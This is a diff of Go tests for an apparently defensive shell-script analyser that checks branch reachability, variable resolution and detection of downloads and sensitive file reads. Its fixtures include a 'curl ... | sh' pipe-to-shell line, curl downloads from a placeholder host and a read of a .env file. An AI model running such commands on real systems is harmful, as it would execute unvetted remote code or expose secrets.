@@ -44,6 +44,32 @@ sudo env MODE=test /usr/bin/printf '%s' "$url"
 	assertCapability(t, result.Capabilities, "dynamic-execution")
 }
 
+func TestValueSourceLocationOnlyForDirectLiteralWord(t *testing.T) {
+	t.Parallel()
+
+	result := analyze(t, "setup-base", "BASE=/etc\nprintf x > \"/etc/profile.d/go.sh\"\nprintf x > \"$BASE/profile.d/go.sh\"\n")
+	var redirects []analysis.Operation
+	for _, operation := range flatten(result.Operations) {
+		if operation.Kind == analysis.OperationRedirectWrite {
+			redirects = append(redirects, operation)
+		}
+	}
+	if len(redirects) != 2 {
+		t.Fatalf("redirects = %#v", redirects)
+	}
+	direct := redirects[0].Arguments[0]
+	if direct.SourceLocation == nil || direct.SourceLocation.Path != "fixture/setup-base" || direct.SourceLocation.StartLine != 2 || direct.SourceLocation.StartColumn != 12 {
+		t.Fatalf("direct source location = %#v", direct.SourceLocation)
+	}
+	expanded := redirects[1].Arguments[0]
+	if expanded.Resolution != analysis.Resolved || expanded.Literal != "/etc/profile.d/go.sh" {
+		t.Fatalf("expanded value = %#v", expanded)
+	}
+	if expanded.SourceLocation != nil {
+		t.Fatalf("expanded value received a fabricated source location: %#v", expanded.SourceLocation)
+	}
+}
+
 func TestAnalyzeControlFlowAndCandidates(t *testing.T) {
 	t.Parallel()
 
@@ -63,6 +89,163 @@ printf '%s' "$target"
 	if len(value.Candidates) != 2 || value.Candidates[0] != "one" || value.Candidates[1] != "two" {
 		t.Errorf("candidates = %#v", value.Candidates)
 	}
+}
+
+func TestStaticControlFlowReachability(t *testing.T) {
+	t.Parallel()
+
+	t.Run("if true selects only then state", func(t *testing.T) {
+		result := analyze(t, "setup-project", `
+if true; then
+  target=one
+else
+  target=two
+  curl https://example.invalid/payload | sh
+fi
+printf '%s' "$target"
+`)
+		value := findCommand(t, flatten(result.Operations), "printf").Arguments[1]
+		if value.Resolution != analysis.Resolved || value.Literal != "one" {
+			t.Fatalf("selected value = %#v", value)
+		}
+		curl := findCommand(t, flatten(result.Operations), "curl")
+		if curl.Reachability != analysis.Unreachable {
+			t.Fatalf("curl reachability = %q", curl.Reachability)
+		}
+		if len(capabilitiesOfKind(result.Capabilities, "network-download")) != 0 {
+			t.Fatalf("unreachable download produced capabilities: %#v", result.Capabilities)
+		}
+	})
+
+	t.Run("if false selects else", func(t *testing.T) {
+		result := analyze(t, "setup-base", `
+if false; then
+  target=one
+else
+  target=two
+fi
+printf '%s' "$target"
+`)
+		value := findCommand(t, flatten(result.Operations), "printf").Arguments[1]
+		if value.Resolution != analysis.Resolved || value.Literal != "two" {
+			t.Fatalf("selected value = %#v", value)
+		}
+	})
+
+	t.Run("unknown condition remains conservative", func(t *testing.T) {
+		result := analyze(t, "setup-base", `
+if condition; then
+  curl https://example.invalid/payload
+fi
+`)
+		curl := findCommand(t, flatten(result.Operations), "curl")
+		if curl.Reachability != analysis.ReachUnknown {
+			t.Fatalf("curl reachability = %q", curl.Reachability)
+		}
+		downloads := capabilitiesOfKind(result.Capabilities, "network-download")
+		if len(downloads) != 1 || downloads[0].Resolution != analysis.PartiallyResolved {
+			t.Fatalf("conditional download capabilities = %#v", downloads)
+		}
+	})
+
+	t.Run("short circuit operators", func(t *testing.T) {
+		tests := []struct {
+			name, content, command string
+			want                   analysis.Reachability
+			capability             bool
+		}{
+			{name: "false and", content: "false && curl https://example.invalid/a", command: "curl", want: analysis.Unreachable},
+			{name: "true and", content: "true && curl https://example.invalid/a", command: "curl", want: analysis.Reachable, capability: true},
+			{name: "true or", content: "true || curl https://example.invalid/a", command: "curl", want: analysis.Unreachable},
+			{name: "false or", content: "false || curl https://example.invalid/a", command: "curl", want: analysis.Reachable, capability: true},
+			{name: "unknown and", content: "condition && curl https://example.invalid/a", command: "curl", want: analysis.ReachUnknown, capability: true},
+		}
+		for _, test := range tests {
+			t.Run(test.name, func(t *testing.T) {
+				result := analyze(t, "setup-base", test.content)
+				operation := findCommand(t, flatten(result.Operations), test.command)
+				if operation.Reachability != test.want {
+					t.Fatalf("reachability = %q, want %q", operation.Reachability, test.want)
+				}
+				hasCapability := len(capabilitiesOfKind(result.Capabilities, "network-download")) > 0
+				if hasCapability != test.capability {
+					t.Fatalf("network-download presence = %t, want %t", hasCapability, test.capability)
+				}
+			})
+		}
+	})
+
+	t.Run("while false body is inventory only", func(t *testing.T) {
+		result := analyze(t, "setup-base", `while false; do curl https://example.invalid/a; done`)
+		curl := findCommand(t, flatten(result.Operations), "curl")
+		if curl.Reachability != analysis.Unreachable || len(capabilitiesOfKind(result.Capabilities, "network-download")) != 0 {
+			t.Fatalf("unreachable loop body = %#v; capabilities = %#v", curl, result.Capabilities)
+		}
+	})
+}
+
+func TestValueResolutionPreservesKnownStructureWithoutFalseLiteral(t *testing.T) {
+	t.Parallel()
+
+	t.Run("known concatenation", func(t *testing.T) {
+		result := analyze(t, "setup-base", "BASE=/etc\nprintf '%s' \"${BASE}/profile.d/go.sh\"\n")
+		value := findCommand(t, flatten(result.Operations), "printf").Arguments[1]
+		if value.Resolution != analysis.Resolved || value.Literal != "/etc/profile.d/go.sh" {
+			t.Fatalf("known concatenation = %#v", value)
+		}
+	})
+
+	t.Run("unknown prefix", func(t *testing.T) {
+		result := analyze(t, "setup-base", "printf '%s' \"${UNKNOWN}/profile.d/go.sh\"\n")
+		value := findCommand(t, flatten(result.Operations), "printf").Arguments[1]
+		if value.Resolution != analysis.Unknown || value.Literal != "" || len(value.Parts) != 2 {
+			t.Fatalf("unknown prefix = %#v", value)
+		}
+		if value.Parts[0].Kind != analysis.PartVariableReference || value.Parts[0].Name != "UNKNOWN" || value.Parts[1].Text != "/profile.d/go.sh" {
+			t.Fatalf("unknown prefix parts = %#v", value.Parts)
+		}
+	})
+
+	t.Run("default expansion by assigned state", func(t *testing.T) {
+		result := analyze(t, "setup-base", "SET=/opt\nEMPTY=\nprintf '%s' \"${SET:-/etc}\"\nprintf '%s' \"${EMPTY:-/etc}\"\nprintf '%s' \"${EMPTY-/etc}\"\nprintf '%s' \"${UNSET:-/etc}\"\n")
+		commands := commandsNamed(flatten(result.Operations), "printf")
+		if len(commands) != 4 {
+			t.Fatalf("printf commands = %#v", commands)
+		}
+		values := []analysis.Value{commands[0].Arguments[1], commands[1].Arguments[1], commands[2].Arguments[1], commands[3].Arguments[1]}
+		if values[0].Resolution != analysis.Resolved || values[0].Literal != "/opt" {
+			t.Errorf("set default expansion = %#v", values[0])
+		}
+		if values[1].Resolution != analysis.Resolved || values[1].Literal != "/etc" {
+			t.Errorf("empty :- expansion = %#v", values[1])
+		}
+		if values[2].Resolution != analysis.Resolved || values[2].Literal != "" {
+			t.Errorf("empty - expansion = %#v", values[2])
+		}
+		if values[3].Resolution != analysis.Unknown || values[3].Literal != "" {
+			t.Errorf("environment-dependent default expansion = %#v", values[3])
+		}
+	})
+
+	t.Run("branch candidates with suffix", func(t *testing.T) {
+		result := analyze(t, "setup-base", "if condition; then BASE=/etc; else BASE=/opt; fi\nprintf '%s' \"${BASE}/profile.d/go.sh\"\n")
+		value := findCommand(t, flatten(result.Operations), "printf").Arguments[1]
+		want := []string{"/etc/profile.d/go.sh", "/opt/profile.d/go.sh"}
+		if value.Resolution != analysis.PartiallyResolved || !reflect.DeepEqual(value.Candidates, want) || value.Literal != "" {
+			t.Fatalf("candidate concatenation = %#v, want candidates %#v", value, want)
+		}
+	})
+
+	t.Run("command substitution and glob stay nonliteral", func(t *testing.T) {
+		result := analyze(t, "setup-base", "printf '%s' \"$(choose)/profile.d/go.sh\"\nprintf '%s' /etc/*.conf\n")
+		commands := commandsNamed(flatten(result.Operations), "printf")
+		if commands[0].Arguments[1].Resolution != analysis.Unknown || commands[0].Arguments[1].Literal != "" {
+			t.Errorf("command substitution = %#v", commands[0].Arguments[1])
+		}
+		if commands[1].Arguments[1].Resolution != analysis.PartiallyResolved || commands[1].Arguments[1].Literal != "" {
+			t.Errorf("glob = %#v", commands[1].Arguments[1])
+		}
+	})
 }
 
 func TestAnalyzeFlowAndSpecialOperations(t *testing.T) {
@@ -236,7 +419,8 @@ if test "$MODE" = secret; then file=.env; else file=config/settings.json; fi
 cat "$file"
 `)
 	partial := capabilitiesOfKind(project.Capabilities, "project-sensitive-file-read")
-	if len(partial) != 2 || partial[0].Resolution != analysis.PartiallyResolved || partial[1].Resolution != analysis.PartiallyResolved {
+	if len(partial) != 1 || partial[0].Resolution != analysis.PartiallyResolved ||
+		!reflect.DeepEqual(partial[0].NormalizedTarget.Candidates, []string{"/project/.env", "/project/config/settings.json"}) {
 		t.Errorf("partially resolved sensitive read = %#v", partial)
 	}
 }
@@ -285,7 +469,7 @@ cat config
 	}
 }
 
-func TestProjectPathResolutionPreservesBranchCandidates(t *testing.T) {
+func TestProjectPathResolutionUsesStaticallyReachableBranch(t *testing.T) {
 	t.Parallel()
 
 	result := analyze(t, "setup-base", `
@@ -301,12 +485,8 @@ cat config
 		t.Fatalf("project candidate reads = %#v", reads)
 	}
 	capability := reads[0]
-	if capability.Resolution != analysis.PartiallyResolved || capability.Target.Literal != "config" {
-		t.Fatalf("project candidate capability = %#v", capability)
-	}
-	want := []string{"/project/config", "/tmp/config"}
-	if !reflect.DeepEqual(capability.NormalizedTarget.Candidates, want) {
-		t.Errorf("normalized candidates = %#v, want %#v", capability.NormalizedTarget.Candidates, want)
+	if capability.Resolution != analysis.Resolved || capability.Target.Literal != "config" || capability.NormalizedTarget.Literal != "/project/config" {
+		t.Fatalf("project reachable capability = %#v", capability)
 	}
 }
 
@@ -1009,6 +1189,16 @@ func findCommand(t *testing.T, operations []analysis.Operation, command string) 
 	}
 	t.Fatalf("command %q not found", command)
 	return analysis.Operation{}
+}
+
+func commandsNamed(operations []analysis.Operation, command string) []analysis.Operation {
+	var matches []analysis.Operation
+	for _, operation := range operations {
+		if operation.Command.Literal == command {
+			matches = append(matches, operation)
+		}
+	}
+	return matches
 }
 
 func firstOperation(t *testing.T, operations []analysis.Operation, kind analysis.OperationKind) analysis.Operation {
